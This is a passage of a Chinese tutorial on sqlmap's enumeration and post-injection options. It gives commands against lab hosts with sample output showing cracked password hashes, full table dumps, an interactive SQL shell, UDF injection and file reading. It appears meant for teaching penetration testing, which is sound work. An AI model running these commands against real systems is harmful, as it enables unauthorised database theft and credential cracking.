Sqlmap 会先列举用户，再列举用户密码 Hash 值。</p>
<p>下面是一个以 PostgreSQL 为目标的例子：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&quot;</span> <span class="hljs-attr">--passwords</span> -v <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p>部分输出如下所示：</p>
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs prolog">back-end <span class="hljs-symbol">DBMS</span>: <span class="hljs-symbol">PostgreSQL</span><br>[hh:mm:<span class="hljs-number">38</span>] [<span class="hljs-symbol">INFO</span>] fetching database users password hashes<br>do you want to use dictionary attack on retrieved password hashes? [<span class="hljs-symbol">Y</span>/n/q] y<br>[hh:mm:<span class="hljs-number">42</span>] [<span class="hljs-symbol">INFO</span>] using hash method: <span class="hljs-string">&#x27;postgres_passwd&#x27;</span><br>what<span class="hljs-string">&#x27;s the dictionary&#x27;</span>s location? [/software/sqlmap/txt/wordlist.txt]<br>[hh:mm:<span class="hljs-number">46</span>] [<span class="hljs-symbol">INFO</span>] loading dictionary from: <span class="hljs-string">&#x27;/software/sqlmap/txt/wordlist.txt&#x27;</span><br>do you want to use common password suffixes? (slow!) [y/<span class="hljs-symbol">N</span>] n<br>[hh:mm:<span class="hljs-number">48</span>] [<span class="hljs-symbol">INFO</span>] starting dictionary attack (postgres_passwd)<br>[hh:mm:<span class="hljs-number">49</span>] [<span class="hljs-symbol">INFO</span>] found: <span class="hljs-string">&#x27;testpass&#x27;</span> for user: <span class="hljs-string">&#x27;testuser&#x27;</span><br>[hh:mm:<span class="hljs-number">50</span>] [<span class="hljs-symbol">INFO</span>] found: <span class="hljs-string">&#x27;testpass&#x27;</span> for user: <span class="hljs-string">&#x27;postgres&#x27;</span><br>database management system users password hashes:<br>[*] postgres [<span class="hljs-number">1</span>]:<br>  password hash: md5d7d880f96044b72d0bba108ace96d1e4<br>  clear-text password: testpass<br>[*] testuser [<span class="hljs-number">1</span>]:<br>  password hash: md599e5ea7a6f7c3269995cba3927fd0093<br>  clear-text password: testpass<br></code></pre></td></tr></table></figure>
<p>Sqlmap 不仅会列举出密码 Hash，还会解析密码 Hash 格式，并询问用户是否要通过密码字典的方式破解 Hash 值寻找出明文密码。</p>
<p>若想只枚举特定用户的密码使用参数<code>-U</code>指定用户，可用<code>CU</code>来代表当前用户，如：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://192.168.56.102/user.php?id=1&quot;</span> <span class="hljs-attr">--password</span> -U CU<br></code></pre></td></tr></table></figure>
<p>部分输出如下：</p>
<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">database management system users password hashes</span><span class="hljs-punctuation">:</span><br><span class="hljs-attribute">[*] root [1]</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">password hash</span><span class="hljs-punctuation">:</span> <span class="hljs-string">*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span><br>    <span class="hljs-attribute">clear-text password</span><span class="hljs-punctuation">:</span> <span class="hljs-string">root</span><br></code></pre></td></tr></table></figure>
<h4 id="列举数据库管理系统的用户权限">列举数据库管理系统的用户权限</h4>
<blockquote>
<p>参数：<code>--privileges</code></p>
</blockquote>
<p>当前用户有读取包含了数据库管理系统中用户信息的系统表的权限时使用这一参数可以列举数据库管理系统中用户的权限。通过用户权限可以判断哪些用户是管理员。</p>
<p>若想只枚举特定用户的权限使用参数<code>-U</code>指定用户，可用<code>CU</code>来代表当前用户。</p>
<p>若目标是微软的 SQL Server，这一参数会列出每个用户是否是管理员而不列出每个用户的具体权限。</p>
<h4 id="列举数据库管理系统的用户角色">列举数据库管理系统的用户角色</h4>
<blockquote>
<p>参数：<code>--roles</code></p>
</blockquote>
<p>当前用户有读取包含了数据库管理系统中用户信息的系统表的权限时使用这一参数可以列举数据库管理系统中用户的角色。</p>
<p>若想只枚举特定用户的角色使用参数<code>-U</code>指定用户，可用<code>CU</code>来代表当前用户。</p>
<p>官方手册上说只有目标数据库管理系统是 Oracle 时这一功能才可用，但我在 Mysql 中测试也是可用的。</p>
<h4 id="列举数据库管理系统中的所有数据库">列举数据库管理系统中的所有数据库</h4>
<blockquote>
<p>参数：<code>--dbs</code></p>
</blockquote>
<p>当前用户有读取包含了数据库管理系统中可用数据库信息的系统表的权限时使用这一参数可以列举数据库管理系统中所有数据库。</p>
<h4 id="列举数据库数据库的所有表">列举数据库数据库的所有表</h4>
<blockquote>
<p>参数：<code>--tables</code>、<code>--exclude-sysdbs</code> 和<code>-D</code></p>
</blockquote>
<p>当前用户有读取包含了数据库管理系统中可用数据库中数据表信息的系统表的权限时使用参数<code>--tables</code>可以列举用参数<code>-D</code>指定的数据库中的所有数据表。<br />
若没有用参数<code>-D</code>指定数据库，只使用参数<code>--tables</code>会列举所有数据库中所有表。如：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://192.168.56.102/user.php?id=1&quot;</span> -D DBName <span class="hljs-attr">--tables</span><br></code></pre></td></tr></table></figure>
<p>使用参数<code>--exclude-sysdbs</code>可排除系统数据库。在 Oracle 中要指定 TABLESPACE_NAME 而不是数据库名。</p>
<h4 id="列举数据表的所有列">列举数据表的所有列</h4>
<blockquote>
<p>参数：<code>--columns</code>、<code>-C</code>、<code>-T</code> 和<code>-D</code></p>
</blockquote>
<p>如权限允许，使用参数<code>--columns</code>可以列出用<code>-D</code>指定的数据库中用<code>-T</code>指定的表中的所有列的名字和数据类型。</p>
<p>若没有指定数据库则会默认使用当前数据库。还可以用<code>-C</code>指定感兴趣的某几列这样就不用列出所有列来。</p>
<p>下面是以 SQLite 为目标的例子：</p>
<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">python sqlmap.py -u <span class="hljs-string">&quot;http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1&quot;</span> --<span class="hljs-built_in">columns</span> -D testdb -<span class="hljs-built_in">T</span> users<br></code></pre></td></tr></table></figure>
<p>部分输出如下：</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">Database: SQLite_masterdb<br>Table: users<br><span class="hljs-meta">[3 columns]</span><br><span class="hljs-code">+---------+</span>---------+<br><span class="hljs-section">| Column | Type     |</span><br><span class="hljs-section">+---------+---------+</span><br>| id      | INTEGER |<br>| name    | TEXT    |<br><span class="hljs-section">| surname | TEXT    |</span><br><span class="hljs-section">+---------+---------+</span><br></code></pre></td></tr></table></figure>
<p>在 PostgreSQL 中，数据库的名字一定是<code>public</code>或者是某个系统表<br />
。因为在 PostgreSQL 中只能列举当前数据库或系统数据库中数据，而 WEB 应用连接的数据库别名总是<code>public</code>。</p>
<h4 id="列举数据库管理系统的模式">列举数据库管理系统的模式</h4>
<blockquote>
<p>参数：<code>--schema</code> 和<code>--exclude-sysdbs</code></p>
</blockquote>
<p>用户可用此选项列举数据库管理系统的模式。模式列表包含所有数据库、表、列、触发器和他们各自的类型。<br />
同样地，可使用参数<code>--exclude-sysdbs</code>排除系统数据库。</p>
<p>下面是的例子测试对象是 Mysql:</p>
<p>部分输出如下：</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">[...]<br>Database: mysql<br>Table: procs_priv<br>[8 columns]<br>+--------------+----------------------------------------+<br>|<span class="hljs-string"> Column       </span>|<span class="hljs-string"> Type                                   </span>|<br>+--------------+----------------------------------------+<br>|<span class="hljs-string"> Timestamp    </span>|<span class="hljs-string"> timestamp                              </span>|<br>|<span class="hljs-string"> User         </span>|<span class="hljs-string"> char(16)                               </span>|<br>|<span class="hljs-string"> Db           </span>|<span class="hljs-string"> char(64)                               </span>|<br>|<span class="hljs-string"> Grantor      </span>|<span class="hljs-string"> char(77)                               </span>|<br>|<span class="hljs-string"> Host         </span>|<span class="hljs-string"> char(60)                               </span>|<br>|<span class="hljs-string"> Proc_priv    </span>|<span class="hljs-string"> set(&#x27;Execute&#x27;,&#x27;Alter Routine&#x27;,&#x27;Grant&#x27;) </span>|<br>|<span class="hljs-string"> Routine_name </span>|<span class="hljs-string"> char(64)                               </span>|<br>|<span class="hljs-string"> Routine_type </span>|<span class="hljs-string"> enum(&#x27;FUNCTION&#x27;,&#x27;PROCEDURE&#x27;)           </span>|<br>+--------------+----------------------------------------+<br>[...]<br>Database: mysql<br>Table: ndb_binlog_index<br>[7 columns]<br>+-----------+---------------------+<br>|<span class="hljs-string"> Column    </span>|<span class="hljs-string"> Type                </span>|<br>+-----------+---------------------+<br>|<span class="hljs-string"> Position  </span>|<span class="hljs-string"> bigint(20) unsigned </span>|<br>|<span class="hljs-string"> deletes   </span>|<span class="hljs-string"> bigint(20) unsigned </span>|<br>|<span class="hljs-string"> epoch     </span>|<span class="hljs-string"> bigint(20) unsigned </span>|<br>|<span class="hljs-string"> File      </span>|<span class="hljs-string"> varchar(255)        </span>|<br>|<span class="hljs-string"> inserts   </span>|<span class="hljs-string"> bigint(20) unsigned </span>|<br>|<span class="hljs-string"> schemaops </span>|<span class="hljs-string"> bigint(20) unsigned </span>|<br>|<span class="hljs-string"> updates   </span>|<span class="hljs-string"> bigint(20) unsigned </span>|<br>+-----------+---------------------+<br></code></pre></td></tr></table></figure>
<h4 id="列举表中数据条数">列举表中数据条数</h4>
<blockquote>
<p>参数：<code>--count</code></p>
</blockquote>
<p>有时我们只想知道有多少数据而不想知道具体的数据内容，此时就可以使用该参数。如：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1&quot;</span> --<span class="hljs-built_in">count</span> -D testdb<br></code></pre></td></tr></table></figure>
<p>部分输出如下</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">Database: testdb</span><br><span class="hljs-section">+----------------+---------+</span><br><span class="hljs-section">| Table          | Entries |</span><br><span class="hljs-section">+----------------+---------+</span><br>| dbo.users      | 4       |<br><span class="hljs-section">| dbo.users_blob | 2       |</span><br><span class="hljs-section">+----------------+---------+</span><br></code></pre></td></tr></table></figure>
<h4 id="列举表中数据">列举表中数据</h4>
<blockquote>
<p>参数：<code>--dump</code>、<code>-C</code>、<code>-T</code>、<code>-D</code>、<code>--start</code>、<code>--stop</code> 和<code>--where</code></p>
</blockquote>
<p>权限允许时可以列举表中数据。用参数<code>-D</code>指定数据库，用参数<code>-T</code>指定数据表，用参数<code>-C</code>指定目标列。</p>
<p>若只指定了数据表而没有指定数据库则默认使用当前数据库。若没有指定列则列举表中全部列。</p>
<p>下例是以 Firebird 为目标：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://192.168.136.131/sqlmap/firebird/get_int.php?id=1&quot;</span> <span class="hljs-attr">--dump</span> -T users<br></code></pre></td></tr></table></figure>
<p>部分输出如下：</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">Database: Firebird_masterdb<br>Table: USERS<br><span class="hljs-meta">[4 entries]</span><br><span class="hljs-code">+----+</span>--------<span class="hljs-code">+------------+</span><br><span class="hljs-section">| ID | NAME   | SURNAME    |</span><br><span class="hljs-section">+----+--------+------------+</span><br>| 1 | luther | blisset     |<br>| 2 | fluffy | bunny       |<br>| 3 | wu     | ming        |<br><span class="hljs-section">| 4 | NULL   | nameisnull  |</span><br><span class="hljs-section">+---+--------+-------------+</span><br></code></pre></td></tr></table></figure>
<p>只使用参数<code>--dump</code>和<code>-D</code>可以一次性列举整个数据库中所有数据。</p>
<p>Sqlmap 会自动将参数<code>--dump</code>列举的数据保存到 CSV 格式文件中，文件具体路径会在 Sqlmap 的输出中给出，如：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1&quot;</span> -D DSSchool <span class="hljs-attr">--dump</span><br></code></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">[11:15:27] [INFO] analyzing table dump for possible password hashes<br>Database: DSSchool<br>Table: T_SCORESYSTEMTEACHERS<br><span class="hljs-meta">[2 entries]</span><br><span class="hljs-code">+-----+</span>----------<span class="hljs-code">+-------+</span>---------<span class="hljs-code">+----------+</span><br><span class="hljs-section">| AGE | NAME     | TITLE | ACCOUNT | PASSWORD |</span><br><span class="hljs-section">+-----+----------+-------+---------+----------+</span><br>| 21  | neo      | ??    | 001     | 001      |<br><span class="hljs-section">| 31  | morphine | ??    | 002     | 002      |</span><br><span class="hljs-section">+-----+----------+-------+---------+----------+</span><br><br>[11:15:27] [INFO] table <span class="hljs-emphasis">&#x27;DSSchool.T_SCORESYSTEMTEACHERS&#x27;</span> dumped to CSV file <span class="hljs-emphasis">&#x27;/home/werner/.sqlmap/output/192.168.56.102/dump/DSSchool/T_SCORESYSTEMTEACHERS.csv&#x27;</span><br></code></pre></td></tr></table></figure>
<p>截取的输出中最后一行便是 CSV 文件保存的路径。</p>
<p>若只想列举部分数据可以使用参数<code>--start</code>和<code>--stop</code>。如只想列举第一条数据可以添加<code>--stop 1</code>，<br />
只想列举第二和第三条数据可以添加<code>--start 1 --stop 3</code>，可见这是一个左开右闭区间。<br />
区间范围仅在盲注中有效，因为在基于错误信息的注入和联合查询注入中区间范围会被忽略。</p>
<p>除了用区间范围限制列举的数据外，还可以用<code>--where</code>参数来限制列举的数据。<br />
<code>--where</code>参数会被 Sqlmap 转换成 WHERE 子句，如<code>--where id&gt;3</code>会只列举列 id 的值大于 3 的数据。</p>
<p>如你所见，Sqlmap 十分灵活。可以囫囵地列举整个数据库，也可以细致地在表中选择列，在列中又选择特定数据。</p>
<h4 id="列举所有数据库所有表中所有数据">列举所有数据库所有表中所有数据</h4>
<blockquote>
<p>参数：<code>--dump-all</code> 和<code>--exclude-sysdbs</code></p>
</blockquote>
<p>使用参数<code>--dump-all</code>可列举所有数据库所有表中所有数据。同样地，可使用参数<code>--exclude-sysdbs</code>排除系统数据库。</p>
<p>注意微软 SQL Server 的 master 数据库不属于系统数据库，因为有些管理员会在这个数据库中存储用户数据</p>
<h4 id="在数据库表列中搜索">在数据库、表、列中搜索</h4>
<blockquote>
<p>参数：<code>--search</code>、<code>-C</code>、<code>-T</code> 和<code>-D</code></p>
</blockquote>
<p>可以搜索数据库名，在所有数据库中搜索表名，在所有数据库的所有表中搜索列名。</p>
<p>参数<code>--search</code>要和下列参数之一配合使用：</p>
<ul>
<li>-C：后跟以逗号分隔的列名，在整个数据库管理系统中搜索</li>
<li>-T：后跟以逗号分隔的表名，在整个数据库管理系统中搜索</li>
<li>-D：后跟以逗号分隔的库名，在整个数据库管理系统中搜索</li>
</ul>
<p>在搜索时，Sqlmap 会询问用户进行精确搜索还是包含搜索。<br />
默认为包含搜索，即搜索的字符串包含于结果中就认为命中。<br />
精确搜索要求搜索的字符串与结果完全相等。</p>
<h4 id="运行自定义的-sql-语句">运行自定义的 SQL 语句</h4>
<blockquote>
<p>参数：<code>--sql-query</code> 和<code>--sql-shell</code></p>
</blockquote>
<p>这一功能允许执行任意的 SQL 语句，Sqlmap 会自动解析给出的 SQL 语句，选择恰当的注入技术并将给出的 SQL 语句打包到 payload 中。</p>
<p>如果查询是个 SELECT 语句，Sqlmap 会返回查询结果。如果 Web 应用使用的数据库管理系统支持多语句查询，Sqlmap 会使用堆注入技术。<br />
但要注意 Web 应用可能不支持堆查询，例如 PHP 使用 Mysql 时不支持堆查询，但使用 PostgreSQL 时支持堆查询。</p>
<p>下例的目标是 SQL Server 2000：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot;</span> <span class="hljs-attr">--sql-query</span> <span class="hljs-string">&quot;SELECT &#x27;foo&#x27;&quot;</span> -v <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p>部分输出如下：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[hh:mm:<span class="hljs-number">14</span>] [<span class="hljs-keyword">INFO</span>] fetching <span class="hljs-keyword">SQL</span> <span class="hljs-keyword">SELECT</span> query output: <span class="hljs-string">&#x27;SELECT &#x27;</span>foo<span class="hljs-string">&#x27;&#x27;</span><br>[hh:mm:<span class="hljs-number">14</span>] [<span class="hljs-keyword">INFO</span>] retrieved: foo<br><span class="hljs-keyword">SELECT</span> <span class="hljs-string">&#x27;foo&#x27;</span>:<br><span class="hljs-string">&#x27;foo&#x27;</span><span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot;</span> <span class="hljs-attr">--sql-query</span> <span class="hljs-string">&quot;SELECT &#x27;foo&#x27;, &#x27;bar&#x27;&quot;</span> -v <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
<p>部分输出如下：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[hh:mm:50]</span> <span class="hljs-selector-attr">[INFO]</span> fetching SQL SELECT query output: <span class="hljs-string">&#x27;SELECT &#x27;</span>foo<span class="hljs-string">&#x27;, &#x27;</span>bar<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-selector-attr">[hh:mm:50]</span> <span class="hljs-selector-attr">[INFO]</span> the SQL query provided has more than <span class="hljs-selector-tag">a</span> field. sqlmap will now<br>unpack it into distinct queries to be able to retrieve the output even <span class="hljs-keyword">if</span> we are<br>going blind<br><span class="hljs-selector-attr">[hh:mm:50]</span> <span class="hljs-selector-attr">[DEBUG]</span> query: SELECT <span class="hljs-built_in">ISNULL</span>(<span class="hljs-built_in">CAST</span>((<span class="hljs-built_in">CHAR</span>(<span class="hljs-number">102</span>)+<span class="hljs-built_in">CHAR</span>(<span class="hljs-number">111</span>)+<span class="hljs-built_in">CHAR</span>(<span class="hljs-number">111</span>)) AS<br><span class="hljs-function"><span class="hljs-title">VARCHAR</span><span class="hljs-params">(<span class="hljs-number">8000</span>)</span></span>), (<span class="hljs-built_in">CHAR</span>(<span class="hljs-number">32</span>)))<br><span class="hljs-selector-attr">[hh:mm:50]</span> <span class="hljs-selector-attr">[INFO]</span> retrieved: foo<br><span class="hljs-selector-attr">[hh:mm:50]</span> <span class="hljs-selector-attr">[DEBUG]</span> performed <span class="hljs-number">27</span> queries <span class="hljs-keyword">in</span> <span class="hljs-number">0</span> seconds<br><span class="hljs-selector-attr">[hh:mm:50]</span> <span class="hljs-selector-attr">[DEBUG]</span> query: SELECT <span class="hljs-built_in">ISNULL</span>(<span class="hljs-built_in">CAST</span>((<span class="hljs-built_in">CHAR</span>(<span class="hljs-number">98</span>)+<span class="hljs-built_in">CHAR</span>(<span class="hljs-number">97</span>)+<span class="hljs-built_in">CHAR</span>(<span class="hljs-number">114</span>)) AS VA<br><span class="hljs-function"><span class="hljs-title">RCHAR</span><span class="hljs-params">(<span class="hljs-number">8000</span>)</span></span>), (<span class="hljs-built_in">CHAR</span>(<span class="hljs-number">32</span>)))<br><span class="hljs-selector-attr">[hh:mm:50]</span> <span class="hljs-selector-attr">[INFO]</span> retrieved: bar<br><span class="hljs-selector-attr">[hh:mm:50]</span> <span class="hljs-selector-attr">[DEBUG]</span> performed <span class="hljs-number">27</span> quer123456789101112<br></code></pre></td></tr></table></figure>
<p>如你所见，Sqlmap 将提供的 SQL 语句分成了两个不同的 SELECT 语句，并分别返回结果。</p>
<p>参数<code>--sql-shell</code>提供一个交互式的 SQL 语句执行环境，支持 Tab 键补全和命令历史记录。如：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://192.168.56.102/user.php?id=1&quot;</span> --sql-<span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure>
<p>部分输出如下：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[<span class="hljs-number">15</span>:<span class="hljs-number">06</span>:<span class="hljs-number">47</span>] [<span class="hljs-keyword">INFO</span>] calling MySQL shell. <span class="hljs-keyword">To</span> quit <span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;x&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;q&#x27;</span> <span class="hljs-keyword">and</span> press ENTER<br><span class="hljs-keyword">sql</span>-shell&gt; <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;foo&#x27;</span>;<br>[<span class="hljs-number">15</span>:<span class="hljs-number">07</span>:<span class="hljs-number">41</span>] [<span class="hljs-keyword">INFO</span>] fetching <span class="hljs-keyword">SQL</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">statement</span> query output: <span class="hljs-string">&#x27;select &#x27;</span>foo<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;foo&#x27;</span>;:    <span class="hljs-string">&#x27;foo&#x27;</span><br><span class="hljs-keyword">sql</span>-shell&gt; <span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> mysql.<span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">&#x27;root&#x27;</span>;<br>[<span class="hljs-number">15</span>:<span class="hljs-number">07</span>:<span class="hljs-number">42</span>] [<span class="hljs-keyword">INFO</span>] fetching <span class="hljs-keyword">SQL</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">statement</span> query output: <span class="hljs-string">&#x27;select password from mysql.user where user=&#x27;</span>root<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> mysql.<span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">&#x27;root&#x27;</span>; [<span class="hljs-number">1</span>]:<br>[*] *<span class="hljs-number">81</span>F5E21E35407D884A6CD4A731AEBFB6AF209E1B<br><span class="hljs-keyword">sql</span>-shell&gt; <span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;<br>[<span class="hljs-number">15</span>:<span class="hljs-number">11</span>:<span class="hljs-number">15</span>] [<span class="hljs-keyword">INFO</span>] fetching <span class="hljs-keyword">SQL</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">statement</span> query output: <span class="hljs-string">&#x27;show tables&#x27;</span><br>[<span class="hljs-number">15</span>:<span class="hljs-number">11</span>:<span class="hljs-number">15</span>] [<span class="hljs-built_in">WARNING</span>] something went wrong <span class="hljs-keyword">with</span> <span class="hljs-keyword">full</span> <span class="hljs-keyword">UNION</span> technique (could be because <span class="hljs-keyword">of</span> limitation <span class="hljs-keyword">on</span> retrieved number <span class="hljs-keyword">of</span> entries)<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>; [<span class="hljs-number">1</span>]:<br></code></pre></td></tr></table></figure>
<h2 id="注入后">注入后</h2>
<h3 id="文件系统控制">文件系统控制</h3>
<h4 id="清除-sqlmap-创建的临时表和自定义函数">清除 Sqlmap 创建的临时表和自定义函数</h4>
<p>参数：<code>--cleanup</code></p>
<p>强烈推荐在测试结束后使用此参数清除 Sqlmap 创建的临时表和自定义函数，Sqlmap 会尽可能地清除数据库管理系统和文件系统上的入侵痕迹。</p>
<h4 id="udf-注入">UDF 注入</h4>
<blockquote>
<p>参数：<code>--udf-inject</code></p>
</blockquote>
<p>UDF 是<code>user-defined function</code>的缩写，UDF 是一种针对 MySQL 和 PostgreSQL 的高级注入技术，详情见<a target="_blank" rel="noopener" href="http://blog.csdn.net/wn314/article/details/www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857">《Advanced SQL injection to operating system full control》</a>。</p>
<p>可以编译 MySQL 或 PostgreSQL 的共享库、DLL（Windows）和共享对象（Linux/Unix）并将这些文件在本机上的路径提供给 Sqlmap 来进行 UDF 注入。<br />
Sqlmap 会先问一些问题然后上传 UDF 文件并创建 UDF 最后根据问题答案执行 UDF。完成 UDF 注入后，Sqlmap 会删除上传的 UDF 文件。</p>
<blockquote>
<p>参数：<code>--shared-lib</code></p>
</blockquote>
<p>添加此参数 Sqlmap 会在运行时询问共享库文件路径。</p>
<p>在 Sqlmap 安装目录的 udf 目录中有许多 UDF 文件，按照 DMBS、操作系统、位数和版本归类，可以直接使用。</p>
<p>UDF: <a target="_blank" rel="noopener" href="http://www.jb51.net/article/51767.htm">UDF</a></p>
<h4 id="读取文件">读取文件</h4>
<blockquote>
<p>参数：<code>--file-read</code></p>
</blockquote>
<p>当数据库管理系统是 MySQL、PostgreSQL 或微软的 SQL Server 且当前用户有读取文件相关权限时读取文件是可行的。<br />
读取的文件既可以是文件文件也可以是二进制文件，Sqlmap 会处理好的。下例的目标数据库管理系统是 SQL Server 2005：</p>
